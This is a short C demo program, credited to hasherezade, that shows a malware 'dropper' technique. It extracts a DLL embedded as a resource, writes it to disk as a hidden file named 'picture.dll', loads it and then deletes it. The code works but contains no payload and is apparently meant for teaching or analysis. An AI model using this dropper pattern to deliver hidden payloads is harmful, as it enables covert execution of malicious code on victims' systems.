// Drop and run DLL
// This is just a simple demo
// CC-BY hasherezade

#include <windows.h>
#include "resource.h"

#ifdef VERBOSE
    #include <stdio.h>
#endif

HMODULE loadLibVerbose(char *dllName)
{
    HMODULE handle = LoadLibraryA(dllName);
#ifdef VERBOSE
    if (handle == NULL) {
        printf("Could not load the DLL: %s!\n", dllName);
    } else {
        printf("DLL : %s loaded at: %p\n", dllName, handle);
    }
#endif
    return handle;
}

BOOL writeToFile(char* res_data, DWORD res_size, char *payloadName)
{
    HANDLE hFile = CreateFile(payloadName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
    if (hFile == NULL) return FALSE;

    DWORD written = 0;
    BOOL isDropped = WriteFile(hFile, res_data, res_size, &written, NULL);
    CloseHandle(hFile);

    if (isDropped == TRUE) {
    if (res_size != written) { //failed to write full buffer
            DeleteFile(payloadName);
            return FALSE;
        }
    }
    return TRUE;
}

BOOL dropResource(char *payloadName)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(MY_RESOURCE), RT_RCDATA);
    if (!res) return FALSE;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return FALSE;

    char* res_data = (char*) LockResource(res_handle);
    DWORD res_size = SizeofResource(NULL, res);
#ifdef VERBOSE
    printf("Loaded Resource, size = %d\n", res_size);
#endif
    /* you can now use the resource data */

    BOOL isDropped = writeToFile(res_data, res_size, payloadName);

    /* free resource after using*/
    FreeResource(res_handle);
    return isDropped;
}

int main(int argc, char *argv[])
{
    char *path = "picture.dll";
    if (argc >= 2) {
        path = argv[1];
    }
    if (dropResource(path) == FALSE) {
#ifdef VERBOSE
        printf("Dropping failed!\n");
#endif
        return (-1);
    }
    //load
    HMODULE hLib = loadLibVerbose(path);
    bool isOk = (hLib == NULL) ? FALSE: TRUE;

    //delete file after using:
    FreeLibrary(hLib);
    DeleteFile(path);

    system("pause");
    if (isOk) {
        return 0;
    }
    return (-1);
}
